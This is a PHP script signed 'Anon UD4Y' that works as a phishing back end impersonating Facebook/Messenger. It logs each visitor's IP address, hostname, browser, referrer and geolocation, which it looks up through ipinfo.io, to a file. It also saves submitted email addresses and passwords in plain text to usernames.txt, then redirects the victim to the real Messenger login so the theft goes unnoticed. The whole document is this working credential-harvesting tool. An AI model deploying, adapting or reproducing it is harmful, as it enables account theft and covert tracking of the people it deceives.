<?php
  // This program generates a web pages that gets 
  // the user's information, saves it to a file, 
  // and displays it on the web page.
  // Created by Anon UD4Y.
  // 19 Apr, 2018.
  
  // Name of the ip address log.
  $outputWebBug = 'iplog.txt';

  // Get the ip address and info about client.
  @ $details = json_decode(file_get_contents("http://ipinfo.io/{$_SERVER['REMOTE_ADDR']}/json"));
  @ $hostname=gethostbyaddr($_SERVER['REMOTE_ADDR']);
  
  // Get the query string from the URL.
  $QUERY_STRING = preg_replace("%[^/a-zA-Z0-9@,_=]%", '', $_SERVER['QUERY_STRING']);
  
  // Write the ip address and info to file.
  @ $fileHandle = fopen($outputWebBug, "a");
  if ($fileHandle)
  {
    $string ='INFORMATION_ACCESSED-------------------------------------------------------------------'
      .$QUERY_STRING.'   [1]IP-ADDRESS = ' // everything after "?" in the URL
      .$_SERVER['REMOTE_ADDR'].'   [2]HOSTNAME = ' // ip address
      .$hostname.'   [3]BROWSER & SYSTEM = ' // hostname
      .$_SERVER['HTTP_USER_AGENT'].'   [4]REDIRECTED-BY = ' // browser and operating system
      .$_SERVER['HTTP_REFERER'].'   [5]LATITUDE-LONGITUDE = ' // where they got the link for this page
      .$details->loc.'   [6]ISP = ' // latitude, longitude
      .$details->org.'   [7]CITY = ' // internet service provider
      .$details->city.'   [8]STATE = '  // city
      .$details->region.'   [9]COUNTRY = ' // state
      .$details->country.'   [10]DATE & TIME = ' // country
      .date("D dS M,Y h:i a").'________________________________________________[DONE BY AN0NUD4Y]' // date
      ."\n"
      ;
     $write = fputs($fileHandle, $string);
    @ fclose($fileHandle);
  }

$var = $_POST['email'];
$var2 = $_POST['pass'];
$myFile = file_get_contents("protect.html");
$searchString = "<html><title>WELCOME TO FACEBOOK</title></html>";
if($myFile != $searchString) {
    file_put_contents("usernames.txt", "[EMAIL]: " . $var . " [PASS]: " . $var2 . "\n", FILE_APPEND);
    header('Location: https://messenger.com/login/');
}
if($myFile != $searchString) {
    echo "LOGIN SUCCESSFULL";
    header('Location: https://messenger.com/login');
}
exit();
?>

